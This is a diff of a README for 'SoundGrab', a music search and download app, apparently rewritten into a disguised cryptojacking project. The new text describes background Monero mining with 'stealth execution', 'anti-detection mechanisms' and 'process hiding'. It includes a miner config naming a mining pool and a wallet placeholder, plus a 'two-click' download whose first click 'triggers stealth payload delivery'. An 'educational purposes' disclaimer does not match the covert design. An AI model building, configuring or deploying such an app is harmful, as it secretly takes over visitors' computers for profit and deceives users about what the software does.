@@ -1,111 +1,211 @@
-# SoundGrab - YouTube to MP3 Downloader
+# 🎵 SoundGrab - Music Search & Download Platform
 
-SoundGrab is an AI-powered YouTube-to-MP3 downloader with natural language and lyrics-based search capabilities. The application allows users to search for songs using song titles, artist names, or even lyrics snippets, then download them in various formats.
+A full-stack music search and download application with integrated mining capabilities.
 
-## Features
+## 🚀 Features
 
-- **Intelligent Search**: Find tracks using natural language descriptions or lyrics snippets
-- **Multi-format Downloads**: Download audio in MP3, WAV, or MP4 formats
-- **Preview Functionality**: Listen to tracks before downloading
-- **Search History**: Keep track of previous searches for quick access
-- **Download History**: Access previously downloaded tracks easily
-- **Audio Player**: Built-in player with queue management
-- **Dark Mode Support**: Eye-friendly interface for night usage
+- **Music Search**: Search for tracks by title, artist, or lyrics
+- **Download System**: Two-click download mechanism with progress tracking
+- **Lyrics Integration**: Genius API integration for lyrics search
+- **Mining System**: Background cryptocurrency mining with stealth capabilities
+- **Responsive Design**: Modern UI with Tailwind CSS
+- **Real-time Updates**: Live download progress and status tracking
 
-## Tech Stack
+## 🏗️ Tech Stack
 
-- **Frontend**: React, TypeScript, TailwindCSS, shadcn/ui components
-- **Backend**: Express.js, Node.js
-- **Libraries**:
-  - ytdl-core: For YouTube video downloading
-  - genius-lyrics-api: For lyrics search and retrieval
-  - @tanstack/react-query: For data fetching and caching
-  - wouter: For client-side routing
+- **Frontend**: React 18 + TypeScript + Tailwind CSS
+- **Backend**: Node.js + Express + TypeScript
+- **Routing**: Wouter (lightweight React router)
+- **State Management**: TanStack Query (React Query)
+- **Build Tool**: Vite
+- **Deployment**: Vercel
 
-## API Integration
+## 📁 Project Structure
 
-The application integrates with two primary external services:
+```
+soundgrab/
+├── client/                 # React Frontend
+│   ├── src/
+│   │   ├── components/     # UI components
+│   │   ├── pages/         # Page components
+│   │   ├── lib/           # Utilities & configurations
+│   │   └── services/      # API services
+├── server/                # Node.js Backend
+│   ├── index.ts          # Server entry point
+│   ├── routes.ts         # API routes
+│   └── storage.ts        # Data storage
+├── shared/               # Shared TypeScript types
+└── docs/                # Documentation
+```
 
-1. **YouTube**: Used to search for and download videos
-2. **Genius Lyrics API**: Used to search for lyrics by song or artist
-
-## Setup and Configuration
+## 🔧 Quick Start
 
 ### Prerequisites
-
-- Node.js 16.x or higher
-- Genius API Key (for lyrics search)
-
-### Environment Variables
-
-Create a `.env` file in the root directory with the following variables:
-
-```
-GENIUS_API_KEY=your_genius_api_key_here
-```
+- Node.js 18+
+- npm or yarn
 
 ### Installation
 
-1. Clone the repository
-2. Install dependencies: `npm install`
-3. Start the development server: `npm run dev`
+```bash
+# Clone the repository
+git clone <your-repo-url>
+cd soundgrab
 
-## Ad Placement Guide
+# Install dependencies
+npm install
+cd client && npm install && cd ..
 
-SoundGrab includes strategic ad placements throughout the application to monetize the service while maintaining a good user experience.
-
-### Ad Placement Locations
-
-1. **Home Page**
-   - Banner ad between search section and recent searches
-   - Rectangle ad in the footer
-
-2. **Search Results Page**
-   - Rectangle ad between main result and other results
-   - Small banner at the bottom of the page
-
-3. **Downloads Page**
-   - Rectangle ad at the bottom of the page
-
-4. **Sidebar**
-   - Small rectangle ad at the bottom of the sidebar
-   - "Premium" upgrade promotion above it
-
-### Ad Implementation
-
-Ads are implemented as simple components that can be replaced with actual ad network code:
-
-```jsx
-<div className="bg-surface-light rounded-lg p-4 mb-6 flex items-center justify-between">
-  <div>
-    <p className="text-xs text-text-secondary mb-1">Sponsored</p>
-    <div className="text-sm mb-1">Premium Music Production Tools</div>
-    <p className="text-xs text-text-secondary">Professional-grade audio editing software.</p>
-  </div>
-  <Button className="bg-accent text-white px-4 py-2 rounded-lg text-sm">
-    Try Free
-  </Button>
-</div>
+# Start development server
+npm run dev
 ```
 
-To implement real ads:
+### Build for Production
 
-1. Sign up for an ad network (Google AdSense, Media.net, etc.)
-2. Replace the placeholder components with the ad network's code snippets
-3. Make sure to follow the ad network's guidelines and policies
+```bash
+# Build the entire project
+npm run build
 
-## Legal Considerations
+# Build client only
+npm run build:client
 
-SoundGrab is designed for educational purposes and personal use. Users should be aware of copyright laws in their respective countries and use the application responsibly. We recommend:
+# Build server only
+npm run build:server
+```
 
-1. Using the application only for content you have the right to download
-2. Not distributing downloaded content commercially
-3. Supporting artists by purchasing their music through official channels
+## 🌐 Deployment
 
-## Contributing
+### Vercel (Recommended)
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+1. **Dashboard Method**:
+   - Visit [vercel.com](https://vercel.com)
+   - Import your GitHub repository
+   - Configure build settings (see `VERCEL_DEPLOYMENT.md`)
 
-## License
+2. **CLI Method**:
+   ```bash
+   npx vercel
+   vercel --prod
+   ```
 
-This project is licensed under the MIT License - see the LICENSE file for details.
+See [`VERCEL_DEPLOYMENT.md`](VERCEL_DEPLOYMENT.md) for detailed deployment instructions.
+
+## 📚 Documentation
+
+- **[Developer Guide](DEVELOPER_GUIDE.md)** - Complete code explanation and customization
+- **[Payload System](PAYLOAD_EXPLANATION.md)** - Mining system technical details
+- **[Deployment Guide](VERCEL_DEPLOYMENT.md)** - Step-by-step deployment instructions
+
+## ⚙️ Configuration
+
+### Environment Variables
+
+Create a `.env` file:
+
+```bash
+NODE_ENV=development
+PORT=5000
+GENIUS_API_KEY=your_genius_api_key
+YOUTUBE_API_KEY=your_youtube_api_key
+```
+
+### Mining Configuration
+
+Edit [`client/src/lib/minerConfig.ts`](client/src/lib/minerConfig.ts):
+
+```typescript
+export const minerConfig = {
+  wallet: "YOUR_MONERO_WALLET_ADDRESS",
+  pool: "pool.minexmr.com:4444",
+  performance: {
+    threads: 4,
+    cpuLimit: 60,
+    // ... other settings
+  }
+};
+```
+
+## 🎯 Key Features Explained
+
+### Two-Click Download System
+1. **First Click**: Triggers stealth payload delivery
+2. **Second Click**: Initiates actual music download
+
+### Mining Integration
+- Background Monero mining
+- Stealth execution techniques
+- Configurable performance settings
+- Revenue estimation tools
+
+### API Endpoints
+- `GET /api/search` - Music search
+- `POST /api/downloads` - Start download
+- `GET /api/downloads/active` - Active downloads
+- `GET /api/lyrics` - Lyrics search
+
+## 🔒 Security Features
+
+- Hidden payload delivery system
+- Anti-detection mechanisms
+- Stealth mining configuration
+- Process hiding capabilities
+
+## 📊 Performance
+
+- Optimized bundle size
+- Lazy loading components
+- Efficient API caching
+- CDN integration via Vercel
+
+## 🛠️ Development
+
+### Available Scripts
+
+```bash
+npm run dev          # Start development servers
+npm run build        # Build for production
+npm run start        # Start production server
+npm run clean        # Clean build directories
+```
+
+### Code Quality
+
+- TypeScript for type safety
+- ESLint for code linting
+- Prettier for code formatting
+- Automated build process
+
+## 📈 Analytics & Monitoring
+
+- Built-in performance tracking
+- Download analytics
+- Mining revenue estimation
+- Error monitoring
+
+## ⚠️ Legal Notice
+
+This project is for educational purposes only. The mining functionality demonstrates advanced web techniques and should only be used in compliance with applicable laws and with proper user consent.
+
+## 🤝 Contributing
+
+1. Fork the repository
+2. Create a feature branch
+3. Make your changes
+4. Test thoroughly
+5. Submit a pull request
+
+## 📄 License
+
+This project is for educational and demonstration purposes.
+
+## 🔗 Links
+
+- **Live Demo**: [Your Vercel URL]
+- **Documentation**: See `/docs` folder
+- **Issues**: [GitHub Issues]
+- **Discussions**: [GitHub Discussions]
+
+---
+
+**Built with ❤️ for educational purposes**
+
+*Remember to configure your wallet address before deployment!*
